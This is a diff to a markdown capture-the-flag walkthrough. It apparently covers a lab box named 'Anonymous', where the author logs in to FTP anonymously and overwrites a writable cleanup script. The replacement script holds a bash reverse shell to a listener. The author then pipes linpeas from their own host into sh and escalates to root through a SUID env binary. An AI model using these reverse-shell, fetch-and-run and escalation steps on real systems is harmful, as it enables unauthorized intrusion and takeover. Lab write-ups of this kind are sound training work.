@@ -89,25 +89,149 @@ As we can see open port 21 FTP says:
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_drwxrwxrwx	2 111  	113      	4096 Jun 04  2020 scripts [NSE: writeable]
 ```
-ftp Anonymous FTP login allowed. So we can use the smbclient with anonymous user.
+ftp Anonymous FTP login allowed. So we can use the ftp with anonymous user.
 
-Use smbclient command:
-`
+`ftp [IP_Target]`
 
+```
+Connected to Target.
+220 NamelessOne's FTP Server!
+Name (Target:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||52432|)
+150 Here comes the directory listing.
+drwxrwxrwx	2 111  	113      	4096 Jun 04  2020 scripts
+226 Directory send OK.
+```
+We are into the ftp machine. 
 
-└─$ smbclient -L 10.10.212.113
-Password for [WORKGROUP\kali]:
+We can see on ftp we got the folder scripts. 
 
-    	Sharename   	Type  	Comment
-    	---------   	----  	-------
-    	print$      	Disk  	Printer Drivers
-    	pics        	Disk  	My SMB Share Directory for Pics
-    	IPC$        	IPC   	IPC Service (anonymous server (Samba, Ubuntu))
-Reconnecting with SMB1 for workgroup listing.
+We can get in to the scripts folder.
 
-    	Server           	Comment
-    	---------        	-------
+```
+ftp> cd scripts
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||38352|)
+150 Here comes the directory listing.
+-rwxr-xrwx	1 1000 	1000      	314 Jun 04  2020 clean.sh
+-rw-rw-r--	1 1000 	1000     	1247 Jan 09 10:06 removed_files.log
+-rw-r--r--	1 1000 	1000       	68 May 12  2020 to_do.txt
+226 Directory send OK.
+```
+And now we can see the 3 files on scripts folder (clean.sh, removed_files.log & to_do_txt)
 
-    	Workgroup        	Master
-    	---------        	-------
-    	WORKGROUP        	ANONYMOUS
+We can download the 3 files on this scripts folder.
+
+```
+ftp> mget *
+mget clean.sh [anpqy?]?
+229 Entering Extended Passive Mode (|||12870|)
+150 Opening BINARY mode data connection for clean.sh (314 bytes).
+100% |*******************************|   314  	110.62 KiB/s	00:00 ETA
+226 Transfer complete.
+314 bytes received in 00:00 (1.54 KiB/s)
+mget removed_files.log [anpqy?]?
+229 Entering Extended Passive Mode (|||50223|)
+150 Opening BINARY mode data connection for removed_files.log (1247 bytes).
+100% |*******************************|  1247   	20.86 MiB/s	00:00 ETA
+226 Transfer complete.
+1247 bytes received in 00:00 (6.24 KiB/s)
+mget to_do.txt [anpqy?]?
+229 Entering Extended Passive Mode (|||59539|)
+150 Opening BINARY mode data connection for to_do.txt (68 bytes).
+100% |*******************************|	68  	657.48 KiB/s	00:00 ETA
+226 Transfer complete.
+68 bytes received in 00:00 (0.33 KiB/s)
+```
+Ok!. After we download the files, We can open the files one by one.
+
+```
+└─$ cat clean.sh
+#!/bin/bash
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+    	echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
+else
+	for LINE in $tmp_files; do
+    	rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
+fi
+```
+```
+└─$ cat removed_files.log
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+***
+```
+```
+└─$ cat to_do.txt   	 
+I really need to disable the anonymous login...it's really not safe
+```
+After that we can see the clean.sh. We can replace the clean.sh with our shell on [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
+
+And after we change the file with our code. Now we must replace the file on ftp with our code file.
+
+Before we replace it. Don't forget to run the listener using netcat.
+
+`nc -lvnp [Port]
+
+```
+ftp> put clean.sh
+local: clean.sh remote: clean.sh
+229 Entering Extended Passive Mode (|||55931|)
+150 Ok to send data.
+100% |*******************************|	54  	878.90 KiB/s	00:00 ETA
+226 Transfer complete.
+54 bytes sent in 00:00 (0.13 KiB/s)
+```
+After we put the file into the ftp machine.
+
+The listener automated run into the machine ssh machine.
+
+```
+listening on [any] 4444 ...
+connect to [Target] from (UNKNOWN) [10.10.212.113] 54920
+bash: cannot set terminal process group (1368): Inappropriate ioctl for device
+bash: no job control in this shell
+namelessone@anonymous:~$ ls
+ls
+pics
+user.txt
+namelessone@anonymous:~$ cat user.txt
+cat user.txt
+```
+After we got the user the next step it's we must find the root.
+
+I think we can use the linpeas first.
+
+```
+namelessone@anonymous:~$ curl 10.8.8.39/linpeas.sh | sh
+
+-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env
+```
+On the linpeas we got the edited file on env folder.
+
+We can exploit the env with [gtfo](https://gtfobins.github.io/gtfobins/env/)
+
+```
+namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
+/usr/bin/env /bin/sh -p
+whoami
+root
+cat /root/root.txt
+```
+And BOOM! We got the root.
+
+---
